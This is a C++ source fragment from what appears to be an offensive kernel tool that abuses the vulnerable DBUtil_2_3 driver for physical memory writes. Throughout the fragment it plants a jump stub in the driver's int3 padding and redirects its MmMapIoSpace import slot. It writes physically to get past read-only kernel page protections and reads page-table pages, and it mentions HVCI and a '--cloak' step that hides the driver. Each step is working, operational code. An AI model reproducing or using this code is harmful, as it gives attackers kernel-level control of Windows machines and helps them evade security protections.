            if (n > kChunk) n = kChunk;
            if (n + 0x40 <= sz - off) n += 0x40;   // overlap for split runs
            if (!read_drv_pages(base + s.va + off, buf.data(), n)) break;

            size_t i = 0;
            while (i < n) {
                if (buf[i] != 0xCC) { ++i; continue; }
                size_t j = i;
                while (j < n && buf[j] == 0xCC) ++j;
                const size_t run = j - i;
                const uint32_t rva = s.va + off + static_cast<uint32_t>(i);
                const size_t page_off = rva & 0xFFF;
                if (run >= need && run <= 0x1000 && page_off + need <= 0x1000) {
                    if (!have || rva > best.rva) {
                        best.va = base + rva;
                        best.rva = rva;
                        best.room = run;
                        have = true;
                    }
                }
                i = j;
            }
        }
    }
    return have;
}

// 11-byte rel32 form when the driver and ntoskrnl are within +/-2 GB
// (they are, both live in the kernel image region); 18-byte movabs fallback.
size_t build_stub(uint64_t site, uint64_t real_map, uint8_t out[18], bool force_movabs = false) {
    const int64_t delta = static_cast<int64_t>(real_map) - static_cast<int64_t>(site + 11);
    out[0] = 0x41; out[1] = 0xB8; out[2] = 0x01; out[3] = 0;
    out[4] = 0;    out[5] = 0;
    if (!force_movabs && delta >= -2147483648LL && delta <= 2147483647LL) {
        out[6] = 0xE9;
        int32_t d = static_cast<int32_t>(delta);
        memcpy(out + 7, &d, 4);
        return 11;
    }
    out[6] = 0x48; out[7] = 0xB8;
    memcpy(out + 8, &real_map, 8);
    out[16] = 0xFF; out[17] = 0xE0;
    return 18;
}

// Write through the driver's PHYSICAL path, never vwrite: image pages are
// read-only (.text PAGE_EXECUTE_READ, .rdata PAGE_READONLY) and a kernel-VA
// memmove into them bugchecks (0xBE/0x50). The physical mapping bypasses the
// protection bits and the RO TLB entry entirely.
bool phys_write_va(uint64_t va, const void* data, size_t len) {
    const auto* p = static_cast<const uint8_t*>(data);
    for (size_t i = 0; i < len;) {
        uint64_t pa{};
        if (!vmm::safe_translate(va + i, pa)) {
            printf("[!] VA 0x%llx is not present through the PTE self-map - refusing\n",
                   (unsigned long long)(va + i));
            return false;
        }
        size_t n = 0x1000 - ((va + i) & 0xFFF);
        if (n > len - i) n = len - i;
        printf("[G3] pwrite va 0x%llx -> pa 0x%llx (%zu bytes)\n",
               (unsigned long long)(va + i), (unsigned long long)pa, n);
        if (!pwrite(pa, p + i, n)) {
            printf("[!] physical write failed at pa 0x%llx\n", (unsigned long long)pa);
            return false;
        }
        i += n;
    }

    // Cached read-back: the IOCTL maps MmNonCached while the image is cached.
    // If the new bytes are visible here, instruction fetch sees them too.
    std::vector<uint8_t> back(len, 0);
    if (!vread(va, back.data(), len)) {
        printf("[!] cached read-back failed\n");
        return false;
    }
    if (memcmp(back.data(), data, len) != 0) {
        printf("[!] cached read-back mismatch - noncached write not visible\n");
        return false;
    }
    printf("[+] G4 cached vread read-back matches; coherent bytes are visible before use\n");
    return true;
}

} // anonymous namespace

bool patch_cached_map(bool dry_run, const char* step) {
    const bool do_stub = !step || !*step || !strcmp(step, "stub") || !strcmp(step, "both");
    const bool do_import = !step || !*step || !strcmp(step, "import") || !strcmp(step, "both");
    if (!do_stub && !do_import) {
        printf("[!] unknown --dpatch-step '%s' (stub|import)\n", step);
        return false;
    }

    if (hvci_running())
        printf("[!] HVCI reports enabled. Image pages are RO either way; this\n"
               "    patch writes physically, but verify the read-back below.\n");
    if (!vmm::g_ntos) {
        printf("[!] ntoskrnl base unknown\n");
        return false;
    }

    uint64_t mm_rva{};
    if (!vmm::export_rva("MmMapIoSpace", mm_rva)) {
        printf("[!] MmMapIoSpace is not in ntoskrnl's export directory\n");
        return false;
    }
    if (!mm_rva || mm_rva + 16 > vmm::g_ntos_size) {
        printf("[!] MmMapIoSpace RVA 0x%llx is outside the image\n",
               (unsigned long long)mm_rva);
        return false;
    }
    const uint64_t real_map = vmm::g_ntos + mm_rva;

    uint8_t head[16]{};
    if (!vread(real_map, head, sizeof(head))) {
        printf("[!] cannot read ntos!MmMapIoSpace at 0x%llx\n",
               (unsigned long long)real_map);
        return false;
    }
    static const uint8_t expected_prolog[8] =
        { 0x48, 0x83, 0xEC, 0x28, 0x41, 0x0F, 0xB6, 0xC0 }; // measured on 26200
    if (memcmp(head, expected_prolog, sizeof(expected_prolog)) != 0) {
        printf("[!] MmMapIoSpace prologue gate rejected 0x%llx:",
               (unsigned long long)real_map);
        for (uint8_t b : head) printf(" %02x", b);
        printf("\n");
        return false;
    }
    std::vector<vmm::Section> ntsecs;
    bool export_is_code = false;
    if (!vmm::sections(ntsecs)) {
        printf("[!] cannot validate MmMapIoSpace against ntoskrnl sections\n");
        return false;
    }
    for (const auto& s : ntsecs) {
        if (!(s.chars & IMAGE_SCN_MEM_EXECUTE) || mm_rva < s.va) continue;
        const uint64_t delta = mm_rva - s.va;
        if (delta <= s.size && 16 <= s.size - delta) { export_is_code = true; break; }
    }
    if (!export_is_code) {
        printf("[!] MmMapIoSpace is not inside an executable ntoskrnl section\n");
        return false;
    }
    printf("[+] MmMapIoSpace = ntos+0x%llx (0x%llx), prologue:",
           (unsigned long long)mm_rva, (unsigned long long)real_map);
    for (uint8_t b : head) printf(" %02x", b);
    printf("\n");
    printf("[*] single-address read-only probe: --kvread 0x%llx 16 (no writes)\n",
           (unsigned long long)real_map);

    // Cheap, crash-free locator first: NtQuerySystemInformation names the
    // module without touching PsLoadedModuleList. The loader-list scan is
    // only a fallback (it is the path that used to poke decoy qwords).
    uint64_t drv{};
    uint32_t drv_size{};
    bool have = find_driver_base(drv, drv_size);
    if (!have) {
        printf("[*] SystemModuleInformation did not name the driver - trying PsLoadedModuleList\n");
        have = cloak::module_base(drv, drv_size);
    }
    if (!have) {
        printf("[!] driver module not located\n"
               "    either the driver is not loaded (sc start DBUtil_2_3), the\n"
               "    image name is wrong (--driver-name), or it is already cloaked:\n"
               "    reboot, load it, then run --dpatch BEFORE --cloak\n");
        return false;
    }
    printf("[+] driver module base 0x%llx size 0x%x\n",
           (unsigned long long)drv, drv_size);

    DrvPe pe{};
    if (!read_drv_pe(drv, pe)) {
        printf("[!] cannot parse the driver PE headers at 0x%llx\n",
               (unsigned long long)drv);
        return false;
    }
    printf("[*] driver SizeOfImage 0x%x, %zu section(s)\n", pe.size, pe.secs.size());

    StubSite existing{};
    const bool have_existing = find_existing_stub(drv, pe, real_map, existing);

    uint64_t slot{};
    uint32_t slot_rva{};
    bool already_patched = false;
    if (!find_iat_slot(drv, pe, real_map,
                       have_existing ? existing.va : 0,
                       slot, slot_rva, already_patched)) {
        printf("[!] no IAT slot in a resident section points at ntos!MmMapIoSpace\n"
               "    (foreign build, or the driver resolves it another way)\n");
        return false;
    }
    uint64_t imp{};
    if (!vread(slot, &imp, 8)) {
        printf("[!] cannot read the IAT slot at 0x%llx\n", (unsigned long long)slot);
        return false;
    }
    printf("[*] MmMapIoSpace IAT slot 0x%llx (rva 0x%x) currently 0x%llx%s\n",
           (unsigned long long)slot, slot_rva, (unsigned long long)imp,
           already_patched ? " (stub)" : "");

    StubSite site{};
    uint8_t stub[18]{};
    size_t stub_len = 0;

    if (have_existing) {
        site = existing;
        stub_len = build_stub(site.va, real_map, stub, existing.room == 18);
        printf("[*] existing cached-map stub at 0x%llx (rva 0x%x)\n",
               (unsigned long long)site.va, site.rva);
    } else {
        if (!do_stub) {
            printf("[!] --dpatch-step import needs a stub already planted\n"
                   "    run --dpatch-step stub first\n");
            return false;
        }
        if (!find_cc_run(drv, pe, 11, site)) {
            printf("[!] no int3 run >= 11 bytes inside an executable section\n");
            return false;
        }
        stub_len = build_stub(site.va, real_map, stub);
        if (stub_len > site.room) {
            if (!find_cc_run(drv, pe, 18, site)) {
                printf("[!] no int3 run >= 18 bytes for the movabs stub\n");
                return false;
            }
            stub_len = build_stub(site.va, real_map, stub);
            if (stub_len > site.room) {
                printf("[!] stub (%zu bytes) does not fit the %zu-byte int3 run\n",
                       stub_len, site.room);
                return false;
            }
        }
        printf("[*] stub site 0x%llx (rva 0x%x, %zu int3 bytes, %zu-byte stub)\n",
               (unsigned long long)site.va, site.rva, site.room, stub_len);
    }

    const DrvSection* slot_sec = sec_for_rva(pe, slot_rva, 8);
    const DrvSection* stub_sec = sec_for_rva(pe, site.rva, static_cast<uint32_t>(stub_len));
    if (!slot_sec || !stub_sec || !sec_resident(*slot_sec) ||
        (slot_sec->chars & (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)) ||
        !sec_code_resident(*stub_sec)) {
        printf("[!] G2 failed: patch targets are not in resident RO sections\n");
        return false;
    }
    printf("[+] G2 RO sections: stub rva 0x%x chars 0x%lx; IAT rva 0x%x chars 0x%lx\n",
           stub_sec->va, (unsigned long)stub_sec->chars,
           slot_sec->va, (unsigned long)slot_sec->chars);
    if (!(stub_sec->chars & IMAGE_SCN_MEM_NOT_PAGED) ||
        !(slot_sec->chars & IMAGE_SCN_MEM_NOT_PAGED)) {
        printf("[*] NOT_PAGED clear (stub=%d, IAT=%d); G1/live-page reads prove presence\n",
               !(stub_sec->chars & IMAGE_SCN_MEM_NOT_PAGED) ? 0 : 1,
               !(slot_sec->chars & IMAGE_SCN_MEM_NOT_PAGED) ? 0 : 1);
    }

    // Hard gate: a foreign build or a slot pointing somewhere else is a
    // refusal, never a "best effort" write.
    if (imp != real_map && imp != site.va) {
        printf("[!] import slot holds 0x%llx, expected MmMapIoSpace 0x%llx or the\n"
               "    stub 0x%llx - wrong build, not patching\n",
               (unsigned long long)imp, (unsigned long long)real_map,
               (unsigned long long)site.va);
        return false;
    }
    if (head[0] == 0xE9) {
        printf("[!] MmMapIoSpace starts with a jmp - export is forwarded, not patching\n");
        return false;
    }

    printf("[*] stub bytes (%zu):", stub_len);
    for (size_t i = 0; i < stub_len; ++i) printf(" %02x", stub[i]);
    printf("\n");

    // Physical write prerequisite: both target pages must be reachable
    // through the runtime PTE self-map. If this fails we write NOTHING.
    uint64_t slot_pa{}, stub_pa{};
    if (!vmm::safe_translate(slot, slot_pa)) {
        printf("[!] import slot page is not present through the PTE self-map - refusing\n");
        return false;
    }
    if (!vmm::safe_translate(site.va, stub_pa)) {
        printf("[!] stub page is not present through the PTE self-map - refusing\n");
        return false;
    }
    printf("[+] G1 PTE present: IAT slot VA 0x%llx -> PA 0x%llx\n",
           (unsigned long long)slot, (unsigned long long)slot_pa);
    printf("[+] G1 PTE present: stub VA 0x%llx -> PA 0x%llx\n",
           (unsigned long long)site.va, (unsigned long long)stub_pa);
    printf("[+] G3 write mapping: kernel self-map translation + physical pwrite; "
           "no RO virtual write or TLB modification\n");

    if (dry_run) {
        printf("[*] dry run: no writes\n"
               "[*] plan: stub 0x%llx <- %zu bytes; slot 0x%llx <- 0x%llx\n",
               (unsigned long long)site.va, stub_len,
               (unsigned long long)slot, (unsigned long long)site.va);
        return true;
    }

    if (do_stub) {
        bool stub_ok = false;
        if (have_existing) {
            uint8_t cur[18]{};
            if (!vread(site.va, cur, stub_len) || memcmp(cur, stub, stub_len) != 0) {
                printf("[!] an existing stub at 0x%llx does not match this build"
                       " - refusing\n", (unsigned long long)site.va);
                return false;
            }
            stub_ok = true;
        }
        if (stub_ok) {
            printf("[*] stub already present\n");
        } else {
            printf("[*] planting the cached-map stub (physical write, no vwrite)\n");
            if (!phys_write_va(site.va, stub, stub_len)) {
                printf("[!] stub write failed - import untouched\n");
                return false;
            }
            printf("[+] cached-map stub planted at 0x%llx\n", (unsigned long long)site.va);
        }
        if (step && !strcmp(step, "stub")) {
            printf("[*] --dpatch-step stub complete; run --dpatch-step import next\n");
            return true;
        }
    }

    if (do_import) {
        if (imp == site.va) {
            printf("[*] import already points at the cached-map stub\n");
        } else {
            uint64_t stub_va = site.va;
            printf("[*] redirecting the import slot (physical write)\n");
            if (!phys_write_va(slot, &stub_va, 8)) {
                // The physical write may have landed even if the cached
                // read-back was stale. Put the original pointer back.
                uint64_t cur{};
                if (vread(slot, &cur, 8) && cur != imp) {
                    uint64_t restored = 0;
                    if (pwrite(slot_pa, &imp, 8) &&
                        vread(slot, &restored, 8) && restored == imp) {
                        printf("[*] original import pointer restored and verified\n");
                    } else {
                        printf("[!] import rollback NOT verified; expected 0x%llx, "
                               "last read 0x%llx - inspect the slot manually\n",
                               (unsigned long long)imp, (unsigned long long)cur);
                    }
                }
                return false;
            }
            printf("[+] MmMapIoSpace import redirected to the stub (MmCached)\n");
        }
        if (step && !strcmp(step, "import")) {
            printf("[*] --dpatch-step import complete\n");
            return true;
        }
    }

    // Prove it with a real page-table page: the self-map PML4 entry points at
    // the PML4 page itself, so its PFN is a page-table physical address. Before
    // the patch MmNonCached refuses that PFN; after the patch it must read.
    uint64_t pml4_pa = 0;
    if (vmm::g_pte_base) {
        constexpr uint64_t kMask48 = 0x0000FFFFFFFFFFFFull;
        const uint64_t b = vmm::g_pte_base;
        const uint64_t pde = b + ((b & kMask48) >> 9);
        const uint64_t ppe = b + ((pde & kMask48) >> 9);
        const uint64_t pxe = b + ((ppe & kMask48) >> 9);
        const uint64_t idx = (b >> 39) & 0x1FF;
        uint64_t e{};
        if (vread(pxe + idx * 8, &e, 8) && (e & 1))
            pml4_pa = e & vmm::kPteMask;
    }

    struct T { uint64_t pa; const char* tag; bool must; };
    const T tests[] = {
        { pml4_pa,  "PML4 page",   pml4_pa != 0 },
        { 0x400,    "firmware BDA", false },
    };
    bool all = true;
    for (const T& tc : tests) {
        uint8_t b[16]{};
        const bool ok = tc.pa && pread(tc.pa, b, sizeof(b));
        printf("[*] phys read 0x%llx (%-14s): %s  %02x %02x %02x %02x %02x %02x %02x %02x\n",
               (unsigned long long)tc.pa, tc.tag, ok ? "OK" : "FAIL",
               b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
        if (tc.must && !ok) all = false;
    }
    if (!all) {
        printf("[!] page-table physical reads still fail after the patch\n");
        return false;
    }
    if (pml4_pa) printf("[+] G4 runtime proof: patched MmMapIoSpace read the PML4 page "
                        "(PA 0x%llx)\n", (unsigned long long)pml4_pa);
    printf("[*] patch is memory-only: re-run --dpatch on every boot, before --cloak\n");
    return true;
}

} // namespace r0
